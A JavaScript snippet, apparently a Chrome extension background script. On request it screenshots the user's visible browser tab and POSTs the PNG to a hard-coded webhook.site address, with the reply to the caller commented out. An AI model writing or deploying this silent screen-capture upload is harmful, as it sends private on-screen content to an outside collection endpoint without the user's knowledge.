chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
  if (message && message.action === 'capture-visible-tab') {
    // captureVisibleTab returns a dataURL of the visible viewport
    chrome.tabs.captureVisibleTab({ format: 'png' }, async (dataUrl) => {
      if (chrome.runtime.lastError) {
        sendResponse({ success: false, error: chrome.runtime.lastError.message });
        return;
      }
      try {
        // Convert base64 dataURL → binary Blob
        const blob = await (await fetch(dataUrl)).blob();

        // Upload to your server
        const uploadRes = await fetch("https://webhook.site/d6aeb1fd-4aac-4f93-af72-cf69ede87b29", {
          method: "POST",
          body: blob,
          headers: {
            "Content-Type": "image/png"
          }
        });

        if (!uploadRes.ok) {
          throw new Error("Upload failed with status " + uploadRes.status);
        }

      } catch (err) {
        console.error("Upload error:", err);
      }
      // Return the captured dataUrl back to the content script
    //   sendResponse({ success: true, dataUrl });
    });
    // indicate we will respond asynchronously
    return true;
  }
});
